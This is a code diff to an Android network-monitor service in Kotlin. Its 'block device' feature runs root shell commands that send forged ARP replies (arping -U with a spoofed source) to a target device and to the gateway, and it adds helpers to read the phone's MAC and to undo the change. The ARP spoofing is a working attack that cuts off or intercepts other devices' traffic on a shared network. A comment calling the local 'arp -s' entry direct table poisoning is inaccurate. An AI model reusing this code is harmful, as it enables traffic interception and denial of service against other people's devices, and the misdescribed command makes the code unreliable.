@@ -267,21 +267,75 @@ class NetworkMonitorService {
         }
 
         return try {
+            // Get the gateway IP to perform ARP spoofing between the target device and gateway
+            val gatewayIp = getGatewayIp()
+            if (gatewayIp.isNullOrEmpty()) {
+                Log.e(TAG, "Could not determine gateway IP for ARP spoofing")
+                return false
+            }
+
+            // Perform ARP spoofing to redirect traffic between target device and gateway
             val process = Runtime.getRuntime().exec("su")
             val outputStream = DataOutputStream(process.outputStream)
 
-            // Perform ARP spoofing to block the device
-            // This is a simplified example - actual implementation would be more complex
-            outputStream.writeBytes("echo 'Performing ARP spoofing to block ${device.ipAddress}'\n")
+            // Send fake ARP replies to the target device, claiming we are the gateway
+            outputStream.writeBytes("arping -U -c 1 -s $gatewayIp ${device.ipAddress}\n")
+
+            // Also send fake ARP replies to the gateway, claiming we are the target device
+            outputStream.writeBytes("arping -U -c 1 -s ${device.ipAddress} $gatewayIp\n")
+
+            // Alternatively, we can poison the ARP tables directly using arptables or similar
+            // This is a more aggressive approach that associates our MAC with the target's IP
+            val ourMac = getOurMacAddress()
+            if (!ourMac.isNullOrEmpty()) {
+                outputStream.writeBytes("arp -s ${device.ipAddress} $ourMac\n")
+            }
+
             outputStream.writeBytes("exit\n")
             outputStream.flush()
 
             process.waitFor()
-            Log.i(TAG, "Successfully blocked device: ${device.ipAddress}")
+            Log.i(TAG, "Successfully initiated ARP spoofing to block device: ${device.ipAddress}")
             true
         } catch (e: Exception) {
             Log.e(TAG, "Error blocking device ${device.ipAddress}: ${e.message}", e)
             false
+        }
+    }
+
+    /**
+     * Get our own device's MAC address
+     * @return MAC address as a string, or null if unable to determine
+     */
+    private fun getOurMacAddress(): String? {
+        return try {
+            val process = Runtime.getRuntime().exec("su -c \"cat /sys/class/net/wlan0/address\"")
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            val macAddress = reader.readLine()
+            reader.close()
+            process.waitFor()
+
+            if (!macAddress.isNullOrEmpty() && macAddress != "00:00:00:00:00:00") {
+                macAddress.trim()
+            } else {
+                // Try alternative interfaces
+                val interfaces = arrayOf("wlan0", "wlan1", "eth0", "rndis0")
+                for (iface in interfaces) {
+                    val altProcess = Runtime.getRuntime().exec("su -c \"cat /sys/class/net/$iface/address\"")
+                    val altReader = BufferedReader(InputStreamReader(altProcess.inputStream))
+                    val altMac = altReader.readLine()
+                    altReader.close()
+                    altProcess.waitFor()
+
+                    if (!altMac.isNullOrEmpty() && altMac != "00:00:00:00:00:00") {
+                        return altMac.trim()
+                    }
+                }
+                null
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting MAC address: ${e.message}", e)
+            null
         }
     }
 
@@ -421,9 +475,26 @@ class NetworkMonitorService {
             return false
         }
 
-        // Placeholder implementation for unblocking
-        Log.i(TAG, "Successfully unblocked device: ${device.ipAddress}")
-        return true
+        return try {
+            val process = Runtime.getRuntime().exec("su")
+            val outputStream = DataOutputStream(process.outputStream)
+
+            // Clear the poisoned ARP entry for the device
+            outputStream.writeBytes("arp -d ${device.ipAddress}\n")
+
+            // Optionally, refresh the ARP table for the device by pinging it
+            outputStream.writeBytes("ping -c 1 -W 1 ${device.ipAddress}\n")
+
+            outputStream.writeBytes("exit\n")
+            outputStream.flush()
+
+            process.waitFor()
+            Log.i(TAG, "Successfully unblocked device: ${device.ipAddress}")
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "Error unblocking device ${device.ipAddress}: ${e.message}", e)
+            false
+        }
     }
 }
 
